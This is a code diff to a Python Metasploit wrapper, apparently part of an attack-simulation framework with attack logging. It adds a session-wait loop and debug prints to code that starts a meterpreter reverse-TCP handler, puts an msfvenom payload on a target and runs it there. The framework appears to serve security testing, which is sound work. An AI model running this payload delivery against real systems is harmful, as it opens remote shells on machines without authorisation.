@@ -36,6 +36,10 @@ class Metasploit():
             time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.
 
     def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler'):
+        """
+
+        @:returns: res, which contains "job_id" and "uuid"
+        """
         exploit = self.get_client().modules.use('exploit', exploit)
         # print(exploit.description)
         # print(exploit.missing_required)
@@ -45,6 +49,7 @@ class Metasploit():
         payload["LHOST"] = self.attacker.get_ip()
         res = exploit.execute(payload=payload)
         print(res)
+        return res
 
     def start_msfrpcd(self, username):
         """ Starts the msfrpcs on the attacker. Metasploit must alredy be installed there ! """
@@ -60,17 +65,25 @@ class Metasploit():
         self.client = MsfRpcClient(self.password, **self.kwargs)
         return self.client
 
+    def wait_for_session(self):
+        """ Wait until we get a session """
+
+        retries = 50
+        while self.get_client().sessions.list == {}:
+            time.sleep(1)
+            print(f"Waiting to get any session {retries}")
+            retries -= 1
+            if retries <= 0:
+                raise MetasploitError("Can not find any session")
+
     def get_sid(self, session_number=0):
         """ Get the first session between hacked target and the metasploit server
 
         @param session_number: number of the session to get
         """
 
-        # TODO improve stability and speed
-        # print("Get SID")
-        while len(self.get_client().sessions.list) <= session_number:
-            time.sleep(1)
-        # print(f"DONE get sid {self.get_client().sessions.list}")
+        self.wait_for_session()
+
         return list(self.get_client().sessions.list)[session_number]
 
     def get_sid_to(self, target):
@@ -78,6 +91,8 @@ class Metasploit():
 
         @param target: a target machine to find in the session list
         """
+
+        print(f"Sessions: {self.get_client().sessions.list}")
 
         # Get_ip can also return a network name. Matching a session needs a real ip
         name_resolution_worked = True
@@ -245,7 +260,9 @@ class MSFVenom():
         # Deploy to target
         if self.attack_logger:
             self.attack_logger.start_file_write("", self.target.get_name(), payload_name)
-        self.target.put(src, self.target.get_playground())
+        playground = self.target.get_playground()
+        print(f"Putting to playground {playground}")
+        self.target.put(src, playground)
         if self.attack_logger:
             self.attack_logger.stop_file_write("", self.target.get_name(), payload_name)
 
@@ -262,7 +279,8 @@ class MSFVenom():
 
         if self.attack_logger:
             self.attack_logger.start_execute_payload("", self.target.get_name(), cmd)
-        self.target.remote_run(cmd, disown=True)
+        res = self.target.remote_run(cmd, disown=True)
+        print(f"Running payload, result is {res}")
         if self.attack_logger:
             self.attack_logger.stop_execute_payload("", self.target.get_name(), cmd)
         self.attack_logger.vprint(
